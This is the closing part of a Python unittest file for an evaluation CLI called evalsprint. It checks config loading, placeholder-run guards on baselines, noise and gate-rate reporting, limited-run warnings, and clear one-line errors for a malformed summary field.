        """C17, C18: uncommenting `per_tag: {safety: 5}` and `target_retries: 1` in the template gives a config the loader accepts."""
        from evalsprint.config import SuiteConfig

        with tempfile.TemporaryDirectory() as tmp:
            work = Path(tmp)
            shutil.copytree(TEMPLATES, work / "t", ignore=shutil.ignore_patterns("__pycache__", "github", "evals"))
            text = (work / "t" / "eval.yaml").read_text(encoding="utf-8")
            text = text.replace("  # per_tag: {safety: 5}", "  per_tag: {safety: 5}").replace("# target_retries: 1", "target_retries: 1")
            self.assertIn("  per_tag: {safety: 5}", text)
            (work / "t" / "eval.yaml").write_text(text, encoding="utf-8")
            cfg = SuiteConfig.load(work / "t" / "eval.yaml")
            self.assertEqual(cfg.repeat["n"], 3)
            self.assertEqual(cfg.repeat.get("per_tag"), {"safety": 5})

    def test_the_scaffold_run_carries_the_contract_keys_and_the_placeholder_guard_refuses_it(self):
        """C17, C18: `summary.repeat` is `{n, per_tag}`, `placeholder` is true for the offline target and judge, and `baseline` refuses it."""
        with tempfile.TemporaryDirectory() as tmp:
            work = self.scaffold(tmp)
            run = work / "evals" / "runs" / "smoke"
            done = self.cli(work, "run", "-c", "evals/eval.yaml", "--label", "smoke", "--no-report", "--quiet", "--out", str(run), extra_env={"JUDGE_PROVIDER": "mock"})
            self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
            summary = json.loads((run / "summary.json").read_text(encoding="utf-8"))
            self.assertEqual(summary["repeat"], {"n": 3, "per_tag": {}})
            self.assertIs(summary["placeholder"], True)
            self.assertEqual((summary["n_target_retries"], summary["n_oversize"]), (0, 0))
            refused = self.cli(work, "baseline", str(run), "--to", str(work / "evals" / "baseline"))
            self.assertNotEqual(refused.returncode, 0, refused.stdout + refused.stderr)
            self.assertIn("placeholder", (refused.stdout + refused.stderr).lower())
            self.assertFalse((work / "evals" / "baseline" / "summary.json").exists())
            forced = self.cli(work, "baseline", str(run), "--to", str(work / "evals" / "baseline"), "--force")
            self.assertEqual(forced.returncode, 0, forced.stdout + forced.stderr)
            self.assertTrue((work / "evals" / "baseline" / "summary.json").is_file())

    def test_noise_says_not_estimated_for_the_scaffold_and_prints_the_gate_rates_from_20_repeated_cases(self):
        """C19, C21: `evalsprint noise RUN` (the docs: README CLI reference, workflow README section 9, playbook).

        The 10 cases of the `init` scaffold, repeated 3 times, are below the 20 repeated cases the command needs: it says `not estimated` and
        prints no rate. A suite of 30 repeated cases gets the rates of the whole gate; `--gate` names the gate it prices.
        """
        with tempfile.TemporaryDirectory() as tmp:
            work = self.scaffold(tmp)
            offline = {"JUDGE_PROVIDER": "mock"}
            repeated, once = work / "evals" / "runs" / "repeated", work / "evals" / "runs" / "once"
            self.assertEqual(self.cli(work, "run", "-c", "evals/eval.yaml", "--no-report", "--quiet", "--out", str(repeated), extra_env=offline).returncode, 0)
            self.assertEqual(self.cli(work, "run", "-c", "evals/eval.yaml", "--repeat", "1", "--no-report", "--quiet", "--out", str(once), extra_env=offline).returncode, 0)
            scaffold = self.cli(work, "noise", str(repeated))
            self.assertEqual(scaffold.returncode, 0, scaffold.stdout + scaffold.stderr)
            self.assertIn("not estimated", scaffold.stdout)
            self.assertIn("--repeat 3", scaffold.stdout)
            self.assertIn("Repeated cases:", scaffold.stdout)
            self.assertNotRegex(scaffold.stdout, r"False alarm:\s+about", "no rate may be printed for a noise nobody measured")
            self.assertNotIn("pessimistic", scaffold.stdout.lower())
            unrepeated = self.cli(work, "noise", str(once))
            self.assertIn("--repeat 3", unrepeated.stdout + unrepeated.stderr, "with nothing repeated it must ask for `run --repeat 3`")
            # 30 cases (the scaffold's 10, three times), every one repeated 3 times: enough to price the gate
            cases = work / "evals" / "cases.jsonl"
            rows = [json.loads(line) for line in cases.read_text(encoding="utf-8").splitlines() if line.strip() and not line.startswith("//")]
            self.assertEqual(len(rows), 10)
            cases.write_text("\n".join(json.dumps({**row, "id": f"{row['id']}-{k}"}) for k in range(3) for row in rows) + "\n", encoding="utf-8")
            big = work / "evals" / "runs" / "big"
            self.assertEqual(self.cli(work, "run", "-c", "evals/eval.yaml", "--no-report", "--quiet", "--out", str(big), extra_env=offline).returncode, 0)
            done = self.cli(work, "noise", str(big))
            self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
            self.assertNotIn("not estimated", done.stdout)
            self.assertRegex(done.stdout, r"Repeated cases:\s+30 of 30")
            self.assertRegex(done.stdout, r"False alarm:\s+about [\d.]+% of the pull requests that change nothing are blocked")
            self.assertRegex(done.stdout, r"Detection, 10-point drop:\s+about [\d.]+%")
            self.assertIn("priced at the upper 95% bound of the noise", done.stdout, "the stub is deterministic: no repeated case flipped")
            self.assertIn("Read every figure as \"about\"", done.stdout)
            self.assertIn("Gate used: the gate stored in this run", " ".join(done.stdout.split()))
            # `--gate PATH` names the gate (and its critical tags); `--gate-config` is the same flag; it wins over -c
            gate = work / "critical_billing.yaml"
            gate.write_text("gate:\n  critical_tags: [billing]\n", encoding="utf-8")
            for flag in ("--gate", "--gate-config"):
                named = self.cli(work, "noise", str(big), flag, str(gate))
                self.assertEqual(named.returncode, 0, named.stdout + named.stderr)
                self.assertIn("(--gate)", " ".join(named.stdout.split()))
                self.assertIn("Critical tags: billing", " ".join(named.stdout.split()))
                self.assertRegex(named.stdout, r"critical-case rule alone:\s+about [\d.]+%")
            via_config = self.cli(work, "noise", str(big), "-c", "evals/eval.yaml")
            self.assertIn("(-c)", " ".join(via_config.stdout.split()))
            helped = self.cli(work, "noise", "--help")
            flat = " ".join(helped.stdout.split())
            self.assertIn("at least 20 repeated cases", flat)
            self.assertIn("whole gate", flat)

    def test_baseline_warns_on_a_limited_run_and_a_forged_summary_field_is_named_in_one_line(self):
        """C26: `baseline` copies a partial run with a warning; `report` on a summary with text where a number belongs says which field."""
        with tempfile.TemporaryDirectory() as tmp:
            work = self.scaffold(tmp)
            offline = {"JUDGE_PROVIDER": "mock"}
            full, partial = work / "evals" / "runs" / "full", work / "evals" / "runs" / "partial"
            self.assertEqual(self.cli(work, "run", "-c", "evals/eval.yaml", "--no-report", "--quiet", "--out", str(full), extra_env=offline).returncode, 0)
            self.assertEqual(self.cli(work, "run", "-c", "evals/eval.yaml", "--limit", "4", "--no-report", "--quiet", "--out", str(partial), extra_env=offline).returncode, 0)
            selection = json.loads((partial / "summary.json").read_text(encoding="utf-8"))["selection"]
            self.assertEqual((selection["limited"], selection["n_selected"], selection["n_config"], selection["limit"]), (True, 4, 10, 4))
            self.assertIs(json.loads((full / "summary.json").read_text(encoding="utf-8"))["selection"]["limited"], False)
            for run, limited in ((full, False), (partial, True)):
                with self.subTest(run=run.name):
                    done = self.cli(work, "baseline", str(run), "--to", str(work / "evals" / f"baseline_{run.name}"), "--force")  # --force: the offline run is a placeholder
                    text = " ".join((done.stdout + done.stderr).split())
                    self.assertEqual(done.returncode, 0, text)  # the warning never refuses
                    self.assertEqual("was limited" in text, limited, text)
                    if limited:
                        self.assertIn("--limit 4", text)
                        self.assertIn("covers only 4 of the 10 cases the config selects", text)
            summary_path = full / "summary.json"
            summary = json.loads(summary_path.read_text(encoding="utf-8"))
            summary["pass_rate"] = "x<b>"
            summary_path.write_text(json.dumps(summary), encoding="utf-8")
            forged = self.cli(work, "report", str(full))
            self.assertEqual(forged.returncode, 2, forged.stdout + forged.stderr)
            self.assertEqual(len(forged.stderr.strip().splitlines()), 1, forged.stderr)
            self.assertIn("the field 'pass_rate' should be a number but is", forged.stderr)
            self.assertNotIn("Traceback", forged.stderr)
            helped = " ".join(self.cli(work, "label", "--help").stdout.split())
            self.assertIn("Only the changed outputs need a label when the earlier labels covered every unchanged case", helped)

    def test_repeated_labels_and_previous_labels_are_accepted_by_the_parser(self):
        """C20: `calibrate --labels a --labels b` and `label --previous-labels old.jsonl` (more than once)."""
        from evalsprint.cli import build_parser

        args = build_parser().parse_args(["calibrate", "run", "--labels", "a.jsonl", "--labels", "b.jsonl"])
        self.assertEqual(list(args.labels), ["a.jsonl", "b.jsonl"])
        args = build_parser().parse_args(["label", "run", "--previous-labels", "a.jsonl", "--previous-labels", "b.jsonl"])
        self.assertEqual(list(args.previous_labels), ["a.jsonl", "b.jsonl"])


if __name__ == "__main__":
    unittest.main()
